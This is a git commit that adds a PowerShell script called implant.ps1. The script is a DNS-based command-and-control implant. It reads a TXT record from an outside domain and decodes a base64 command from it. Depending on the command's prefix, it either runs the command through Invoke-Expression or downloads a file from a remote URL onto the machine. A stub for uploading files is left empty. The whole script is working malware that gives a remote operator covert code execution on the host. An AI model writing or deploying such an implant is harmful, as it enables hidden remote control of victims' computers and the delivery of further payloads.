8081b872387771dcfdc2a45f1f5e630ea9650156
TomSomerville <thomas.somerv@gmail.com>
2019-07-23 13:33:54 -0400

    Add files via upload

---
+++ implant.ps1
@@ -0,0 +1,21 @@
+﻿$query = Resolve-DnsName -Type TXT -Name down.thomassomerville.com
+$results = $query.strings -split ","
+$address = $results[0]
+$port = $results[1]
+$cmd = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($results[2]))
+
+if ($cmd.StartsWith("EXEC=")){
+    $exec = iex($cmd.substring(5))
+}
+if ($cmd.StartsWith("RUN=")){
+    iex($cmd.substring(4))
+}
+if ($cmd.StartsWith("DOWN=")){
+    $downCMD = $cmd.substring(5) -split ","
+    Invoke-WebRequest -Uri $downCMD[0] -OutFile $downCMD[1]    
+}
+if ($cmd.StartsWith("PUT=")){
+    $putCMD = $cmd.substring(4) -split ","
+
+}
+
